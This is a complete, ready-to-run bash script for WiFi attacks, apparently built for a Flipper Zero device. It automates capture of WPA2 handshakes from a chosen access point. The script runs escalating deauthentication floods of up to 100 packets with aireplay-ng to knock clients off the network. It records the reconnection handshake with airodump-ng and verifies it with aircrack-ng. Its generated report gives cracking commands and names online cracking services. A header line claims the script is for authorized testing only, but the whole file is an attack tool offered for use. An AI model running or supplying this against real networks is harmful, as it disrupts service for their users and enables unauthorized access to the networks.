#!/bin/bash

################################################################################
# Smart WPA2 Handshake Capture for Flipper Zero BlackHat OS
################################################################################
# Purpose: Intelligent handshake capture with auto-retry and verification
# Author: Generated for authorized penetration testing only
# Requires: BlackHat OS with bh commands, aircrack-ng suite
################################################################################

set -euo pipefail

# Configuration
INTERFACE="${1:-wlan0}"
TARGET_BSSID="${2:-}"
TARGET_CHANNEL="${3:-}"
OUTPUT_DIR="${4:-/root/handshakes}"
TARGET_ESSID="${5:-}"  # Optional, auto-detected if not provided
MAX_ATTEMPTS="${6:-5}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
CAPTURE_PREFIX="${OUTPUT_DIR}/handshake_${TIMESTAMP}"
LOG_FILE="${OUTPUT_DIR}/capture_${TIMESTAMP}.log"

# Deauth strategies (packets to send per attempt)
DEAUTH_STRATEGIES=(5 10 20 50 100)

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

################################################################################
# Logging
################################################################################
log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[${timestamp}] [${level}] ${message}" | tee -a "${LOG_FILE}"
}

################################################################################
# Banner
################################################################################
print_banner() {
    echo -e "${MAGENTA}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║         Smart WPA2 Handshake Capture System v1.0              ║
║           Intelligent Capture with Auto-Retry                 ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

################################################################################
# Usage
################################################################################
usage() {
    echo "Usage: $0 <INTERFACE> <BSSID> <CHANNEL> [OUTPUT_DIR] [ESSID] [MAX_ATTEMPTS]"
    echo ""
    echo "Arguments:"
    echo "  INTERFACE     Monitor interface (e.g., wlan0)"
    echo "  BSSID         Target AP MAC address (e.g., AA:BB:CC:DD:EE:FF)"
    echo "  CHANNEL       WiFi channel number (1-14)"
    echo "  OUTPUT_DIR    Output directory (default: /root/handshakes)"
    echo "  ESSID         Network name (optional, auto-detected)"
    echo "  MAX_ATTEMPTS  Maximum capture attempts (default: 5)"
    echo ""
    echo "Example:"
    echo "  $0 wlan0 AA:BB:CC:DD:EE:FF 6 /root/handshakes"
    exit 1
}

################################################################################
# Validate Arguments
################################################################################
validate_args() {
    if [[ -z "$TARGET_BSSID" ]] || [[ -z "$TARGET_CHANNEL" ]]; then
        echo -e "${RED}Error: Missing required arguments${NC}\n"
        usage
    fi

    # Validate BSSID format
    if ! echo "$TARGET_BSSID" | grep -qE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'; then
        echo -e "${RED}Error: Invalid BSSID format${NC}"
        exit 1
    fi

    # Validate channel
    if ! [[ "$TARGET_CHANNEL" =~ ^[0-9]+$ ]] || [[ "$TARGET_CHANNEL" -lt 1 ]] || [[ "$TARGET_CHANNEL" -gt 14 ]]; then
        echo -e "${RED}Error: Channel must be between 1 and 14${NC}"
        exit 1
    fi

    log "INFO" "Target validation passed"
}

################################################################################
# Pre-flight Checks
################################################################################
preflight_check() {
    log "INFO" "Starting pre-flight checks..."

    # Create output directory
    mkdir -p "${OUTPUT_DIR}"

    # Check interface
    if ! ip link show "${INTERFACE}" &>/dev/null; then
        log "ERROR" "Interface ${INTERFACE} not found"
        echo -e "${RED}Error: Interface ${INTERFACE} does not exist${NC}"
        exit 1
    fi

    # Check for required tools
    for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
        if ! command -v "$cmd" &>/dev/null; then
            log "ERROR" "Required command not found: $cmd"
            echo -e "${RED}Error: $cmd not installed${NC}"
            exit 1
        fi
    done

    # Enable monitor mode
    if ! iw dev "${INTERFACE}" info 2>/dev/null | grep -q "type monitor"; then
        log "INFO" "Enabling monitor mode on ${INTERFACE}..."
        echo -e "${YELLOW}[*] Enabling monitor mode...${NC}"
        airmon-ng start "${INTERFACE}" &>/dev/null || true
        sleep 2
    fi

    log "INFO" "Pre-flight checks completed"
    echo -e "${GREEN}✓ Pre-flight checks passed${NC}\n"
}

################################################################################
# Check for Connected Clients
################################################################################
check_clients() {
    log "INFO" "Checking for connected clients..."
    echo -e "${YELLOW}[*] Scanning for connected clients on ${TARGET_ESSID}...${NC}"

    # Quick 5-second scan to detect clients
    local temp_file="${OUTPUT_DIR}/client_scan_${TIMESTAMP}"
    timeout 5 airodump-ng "${INTERFACE}" \
        --channel "${TARGET_CHANNEL}" \
        --bssid "${TARGET_BSSID}" \
        -w "${temp_file}" \
        --output-format csv \
        </dev/null >/dev/null 2>&1 || true

    # Parse for clients
    local client_count=0
    if [[ -f "${temp_file}-01.csv" ]]; then
        # Convert Windows line endings to Unix
        tr -d '\r' < "${temp_file}-01.csv" > "${temp_file}-01.csv.unix"
        mv "${temp_file}-01.csv.unix" "${temp_file}-01.csv"

        # Count lines in the station section (after "Station MAC")
        client_count=$(awk '/Station MAC/,0' "${temp_file}-01.csv" | tail -n +2 | grep -v "^$" | wc -l)
        rm -f "${temp_file}"-* 2>/dev/null || true
    fi

    if [[ $client_count -gt 0 ]]; then
        log "INFO" "Detected ${client_count} connected client(s)"
        echo -e "${GREEN}✓ Found ${client_count} connected client(s)${NC}"
        return 0
    else
        log "WARN" "No clients detected"
        echo -e "${YELLOW}⚠ No clients currently connected${NC}"
        return 1
    fi
}

################################################################################
# Start Capture
################################################################################
start_capture() {
    log "INFO" "Starting packet capture on channel ${TARGET_CHANNEL}..."
    echo -e "${CYAN}[*] Starting capture...${NC}"

    # Start airodump-ng in background
    airodump-ng "${INTERFACE}" \
        --channel "${TARGET_CHANNEL}" \
        --bssid "${TARGET_BSSID}" \
        -w "${CAPTURE_PREFIX}" \
        --output-format pcap,csv \
        </dev/null >/dev/null 2>&1 &

    AIRODUMP_PID=$!
    log "INFO" "Airodump-ng started with PID ${AIRODUMP_PID}"

    # Give it time to start
    sleep 3
    echo -e "${GREEN}✓ Capture running (PID: ${AIRODUMP_PID})${NC}"
}

################################################################################
# Execute Deauth Attack
################################################################################
deauth_attack() {
    local attempt=$1
    local strategy_index=$((attempt - 1))
    local deauth_count=${DEAUTH_STRATEGIES[$strategy_index]:-100}

    log "INFO" "Executing deauth attack (attempt ${attempt}/${MAX_ATTEMPTS}, ${deauth_count} packets)..."
    echo -e "${YELLOW}[*] Sending ${deauth_count} deauth packets...${NC}"

    # Try targeted deauth first (to broadcast)
    aireplay-ng -0 "${deauth_count}" \
        -a "${TARGET_BSSID}" \
        "${INTERFACE}" \
        >/dev/null 2>&1 &

    local aireplay_pid=$!

    # Show progress
    for ((i=1; i<=${deauth_count}/10; i++)); do
        sleep 0.5
        echo -ne "${CYAN}."
    done
    echo -e "${NC}"

    wait $aireplay_pid 2>/dev/null || true

    log "INFO" "Deauth attack completed"
    echo -e "${GREEN}✓ Deauth packets sent${NC}"
}

################################################################################
# Verify Handshake
################################################################################
verify_handshake() {
    log "INFO" "Verifying handshake capture..."
    echo -e "${YELLOW}[*] Analyzing captured data...${NC}"

    sleep 2  # Give airodump time to write

    # Check if capture file exists
    local cap_file="${CAPTURE_PREFIX}-01.cap"
    if [[ ! -f "$cap_file" ]]; then
        log "ERROR" "Capture file not found: $cap_file"
        return 1
    fi

    # Use aircrack-ng to verify handshake
    local verify_output=$(aircrack-ng "$cap_file" 2>&1 || true)

    if echo "$verify_output" | grep -qi "handshake"; then
        log "SUCCESS" "Handshake captured successfully!"
        echo -e "${GREEN}✓✓✓ HANDSHAKE CAPTURED! ✓✓✓${NC}\n"
        return 0
    else
        log "WARN" "No handshake detected yet"
        echo -e "${YELLOW}✗ No handshake detected${NC}"
        return 1
    fi
}

################################################################################
# Stop Capture
################################################################################
stop_capture() {
    if [[ -n "${AIRODUMP_PID:-}" ]]; then
        log "INFO" "Stopping capture (PID: ${AIRODUMP_PID})..."
        kill $AIRODUMP_PID 2>/dev/null || true
        wait $AIRODUMP_PID 2>/dev/null || true
        echo -e "${BLUE}[*] Capture stopped${NC}"
    fi
}

################################################################################
# Main Capture Loop
################################################################################
capture_loop() {
    local attempt=1
    local success=false

    while [[ $attempt -le $MAX_ATTEMPTS ]]; do
        echo -e "\n${CYAN}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}  Attempt ${attempt}/${MAX_ATTEMPTS}${NC}"
        echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}\n"

        # Check for clients first
        if ! check_clients; then
            echo -e "${YELLOW}[!] Waiting 10 seconds for clients to connect...${NC}"
            sleep 10
            continue
        fi

        # Start fresh capture for this attempt
        start_capture

        # Wait a moment to capture initial handshake if present
        echo -e "${CYAN}[*] Monitoring for existing handshake...${NC}"
        sleep 5

        # Check if we already have it
        if verify_handshake; then
            success=true
            break
        fi

        # Execute deauth to force re-authentication
        deauth_attack $attempt

        # Wait for handshake
        echo -e "${CYAN}[*] Waiting for handshake (20 seconds)...${NC}"
        sleep 20

        # Verify again
        if verify_handshake; then
            success=true
            break
        fi

        # Stop this capture attempt
        stop_capture

        # Increment attempt counter
        ((attempt++)) || true

        if [[ $attempt -le $MAX_ATTEMPTS ]]; then
            echo -e "\n${YELLOW}[!] Attempt failed, retrying with more aggressive strategy...${NC}"
            sleep 5
        fi
    done

    # Final cleanup
    stop_capture

    if $success; then
        return 0
    else
        return 1
    fi
}

################################################################################
# Generate Report
################################################################################
generate_report() {
    local success=$1
    local report_file="${OUTPUT_DIR}/report_${TIMESTAMP}.txt"

    cat > "${report_file}" << REPORT
═══════════════════════════════════════════════════════════════
  Handshake Capture Report
═══════════════════════════════════════════════════════════════

Capture Timestamp: $(date)
Target BSSID:      ${TARGET_BSSID}
Target ESSID:      ${TARGET_ESSID}
Channel:           ${TARGET_CHANNEL}
Interface:         ${INTERFACE}

═══════════════════════════════════════════════════════════════
  Result
═══════════════════════════════════════════════════════════════

Status: $(if $success; then echo "SUCCESS - Handshake captured"; else echo "FAILED - No handshake captured"; fi)

═══════════════════════════════════════════════════════════════
  Files Generated
═══════════════════════════════════════════════════════════════

Capture:  ${CAPTURE_PREFIX}-01.cap
CSV:      ${CAPTURE_PREFIX}-01.csv
Log:      ${LOG_FILE}
Report:   ${report_file}

$(if $success; then
    echo "═══════════════════════════════════════════════════════════════
  Next Steps
═══════════════════════════════════════════════════════════════

Crack the handshake with:
  aircrack-ng ${CAPTURE_PREFIX}-01.cap -w /path/to/wordlist.txt

Or upload to online cracking service:
  https://crackstation.net/
  https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2"
fi)

═══════════════════════════════════════════════════════════════
REPORT

    log "INFO" "Report saved to ${report_file}"
    echo -e "\n${GREEN}✓ Full report saved to ${report_file}${NC}"
}

################################################################################
# Cleanup
################################################################################
cleanup() {
    log "INFO" "Cleaning up..."
    stop_capture

    # Kill any remaining aireplay processes
    pkill -f "aireplay-ng.*${TARGET_BSSID}" 2>/dev/null || true

    log "INFO" "Cleanup completed"
}

################################################################################
# Main Execution
################################################################################
main() {
    print_banner

    # Create output directory first (before any logging)
    mkdir -p "${OUTPUT_DIR}"

    echo -e "${BLUE}Target Configuration:${NC}"
    echo -e "  BSSID:     ${TARGET_BSSID}"
    echo -e "  ESSID:     ${TARGET_ESSID}"
    echo -e "  Channel:   ${TARGET_CHANNEL}"
    echo -e "  Interface: ${INTERFACE}"
    echo -e "  Max Tries: ${MAX_ATTEMPTS}\n"

    validate_args
    preflight_check

    log "INFO" "Starting handshake capture operation"

    if capture_loop; then
        echo -e "\n${GREEN}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}  ✓✓✓ HANDSHAKE CAPTURED SUCCESSFULLY! ✓✓✓${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}\n"
        generate_report true
        exit 0
    else
        echo -e "\n${RED}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${RED}  ✗✗✗ FAILED TO CAPTURE HANDSHAKE ✗✗✗${NC}"
        echo -e "${RED}═══════════════════════════════════════════════════════════════${NC}\n"
        echo -e "${YELLOW}Troubleshooting tips:${NC}"
        echo -e "  • Ensure clients are connected to the target AP"
        echo -e "  • Try increasing MAX_ATTEMPTS"
        echo -e "  • Move closer to the target AP"
        echo -e "  • Verify the BSSID and channel are correct\n"
        generate_report false
        exit 1
    fi
}

# Handle Ctrl+C gracefully
trap 'echo -e "\n${RED}Interrupted by user${NC}"; cleanup; exit 130' INT TERM

# Check for help flag
if [[ "${1:-}" == "-h" ]] || [[ "${1:-}" == "--help" ]]; then
    usage
fi

# Run main function
main "$@"
